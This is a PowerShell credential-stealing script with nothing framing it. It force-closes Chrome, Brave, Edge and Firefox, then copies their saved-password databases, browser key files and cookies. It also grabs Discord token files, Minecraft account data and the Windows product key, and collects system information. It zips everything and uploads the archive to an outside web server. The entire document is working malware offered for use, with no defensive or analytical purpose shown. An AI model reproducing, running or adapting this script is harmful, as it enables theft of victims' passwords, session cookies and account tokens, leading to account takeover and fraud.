# Set destination directory
$destDir = "$env:APPDATA\BrowserData"
if (-Not (Test-Path $destDir)) {
    New-Item -ItemType Directory -Path $destDir
}

# Function to copy browser files
function CopyBrowserFiles($browserName, $browserDir, $filesToCopy) {
    $browserDestDir = Join-Path -Path $destDir -ChildPath $browserName
    if (-Not (Test-Path $browserDestDir)) {
        New-Item -ItemType Directory -Path $browserDestDir
    }

    foreach ($file in $filesToCopy) {
        $source = Join-Path -Path $browserDir -ChildPath $file
        if (Test-Path $source) {
            Copy-Item -Path $source -Destination $browserDestDir
            Write-Host "$browserName - File copied: $file"
        } else {
            Write-Host "$browserName - File not found: $file"
        }
    }
}

# Function to kill browser processes
function KillBrowserProcesses($browserName) {
    $processes = Get-Process | Where-Object { $_.Name -like "*$browserName*" }
    foreach ($process in $processes) {
        Stop-Process -Id $process.Id -Force -ErrorAction SilentlyContinue
        Write-Host "Killing process: $browserName with ID: $($process.Id)"
    }
}

# Google Chrome
$chromeDir = "$env:LOCALAPPDATA\Google\Chrome\User Data\Default"
$chromeFilesToCopy = @("Login Data")
$localStateChrome = Join-Path -Path "$env:LOCALAPPDATA\Google\Chrome\User Data" -ChildPath "Local State"
KillBrowserProcesses "chrome"
CopyBrowserFiles "Chrome" $chromeDir $chromeFilesToCopy
Copy-Item -Path $localStateChrome -Destination (Join-Path -Path $destDir -ChildPath "Chrome") -ErrorAction SilentlyContinue

# Brave
$braveDir = "$env:LOCALAPPDATA\BraveSoftware\Brave-Browser\User Data\Default"
$braveFilesToCopy = @("Login Data")
$localStateBrave = Join-Path -Path "$env:LOCALAPPDATA\BraveSoftware\Brave-Browser\User Data" -ChildPath "Local State"
KillBrowserProcesses "brave"
CopyBrowserFiles "Brave" $braveDir $braveFilesToCopy
Copy-Item -Path $localStateBrave -Destination (Join-Path -Path $destDir -ChildPath "Brave") -ErrorAction SilentlyContinue

# Firefox
$firefoxProfileDir = Join-Path -Path $env:APPDATA -ChildPath "Mozilla\Firefox\Profiles"
$firefoxProfile = Get-ChildItem -Path $firefoxProfileDir -Filter "*.default-release" | Select-Object -First 1
if ($firefoxProfile) {
    $firefoxDir = $firefoxProfile.FullName
    $firefoxFilesToCopy = @("logins.json", "key4.db", "cookies.sqlite", "webappsstore.sqlite", "places.sqlite")
    KillBrowserProcesses "firefox"
    CopyBrowserFiles "Firefox" $firefoxDir $firefoxFilesToCopy
} else {
    Write-Host "Firefox - No profile found."
}

# Microsoft Edge
$edgeDir = "$env:LOCALAPPDATA\Microsoft\Edge\User Data\Default"
$edgeFilesToCopy = @("Login Data")
$localStateEdge = Join-Path -Path "$env:LOCALAPPDATA\Microsoft\Edge\User Data" -ChildPath "Local State"
KillBrowserProcesses "msedge"
CopyBrowserFiles "Edge" $edgeDir $edgeFilesToCopy
Copy-Item -Path $localStateEdge -Destination (Join-Path -Path $destDir -ChildPath "Edge") -ErrorAction SilentlyContinue

# Discord Token Grabber
$discordDir = "$env:APPDATA\Discord\Local Storage\leveldb"
$discordFilesToCopy = @("*.ldb", "*.log")
CopyBrowserFiles "Discord" $discordDir $discordFilesToCopy

# Minecraft Account Grabber
$minecraftDir = "$env:APPDATA\.minecraft"
$minecraftFilesToCopy = @("launcher_accounts.json")
CopyBrowserFiles "Minecraft" $minecraftDir $minecraftFilesToCopy

# Windows Key Grabber
$windowsKey = (Get-WmiObject -query 'select * from SoftwareLicensingService').OA3xOriginalProductKey
$windowsKeyFile = Join-Path -Path $destDir -ChildPath "windows_key.txt"
$windowsKey | Out-File -FilePath $windowsKeyFile -Encoding UTF8

# System Information Grabber
$systemInfo = Get-ComputerInfo
$cpu = Get-WmiObject -class Win32_Processor | Select-Object -ExpandProperty Name
$gpu = Get-WmiObject -class Win32_VideoController | Select-Object -ExpandProperty Name
$ram = Get-WmiObject -class Win32_ComputerSystem | Select-Object -ExpandProperty TotalPhysicalMemory
$systemInfoFile = Join-Path -Path $destDir -ChildPath "system_info.txt"
$systemInfoContent = @"
System Information:
====================
Computer Name: $($systemInfo.CsName)
OS Version: $($systemInfo.WindowsVersion)
Processor: $cpu
RAM: $([math]::round($ram / 1GB, 2)) GB
Graphics Card: $gpu
"@
$systemInfoContent | Out-File -FilePath $systemInfoFile -Encoding UTF8

# Compress all collected data into ZIP
$zipDir = "$env:APPDATA\ZippedBrowserData"
if (-Not (Test-Path $zipDir)) {
    New-Item -ItemType Directory -Path $zipDir
}
$folderPath = $destDir
$zipFilePath = Join-Path -Path $zipDir -ChildPath "BrowserData.zip"
if (Test-Path $zipFilePath) {
    Remove-Item $zipFilePath -Force
}
Compress-Archive -Path "$folderPath\*" -DestinationPath $zipFilePath

# Upload ZIP file to server
$url = "https://alperen.cc/uploadd.php"
if (Test-Path $zipFilePath) {
    try {
        $boundary = [System.Guid]::NewGuid().ToString("N")
        $contentType = "multipart/form-data; boundary=$boundary"
        $fileName = [System.IO.Path]::GetFileName($zipFilePath)
        $header = "--$boundary`r`nContent-Disposition: form-data; name=`"fileToUpload`"; filename=`"$fileName`"`r`nContent-Type: application/zip`r`n`r`n"
        $footer = "`r`n--$boundary--`r`n"
        $fileBytes = [System.IO.File]::ReadAllBytes($zipFilePath)
        $bodyStream = New-Object System.IO.MemoryStream
        $writer = New-Object System.IO.StreamWriter $bodyStream
        $writer.Write($header)
        $writer.Flush()
        $bodyStream.Write($fileBytes, 0, $fileBytes.Length)
        $writer.Flush()
        $writer.Write($footer)
        $writer.Flush()
        $bodyStream.Position = 0
        $bodyBytes = $bodyStream.ToArray()
        $response = Invoke-RestMethod -Uri $url -Method Post -Body $bodyBytes -ContentType $contentType -ErrorAction Stop
        Write-Output $response
        $writer.Dispose()
        $bodyStream.Dispose()
    } catch {
        Write-Host "File upload failed: $_. Exception: $($_.Exception.Message)"
    }
} else {
    Write-Host "ZIP file not found: $zipFilePath"
}
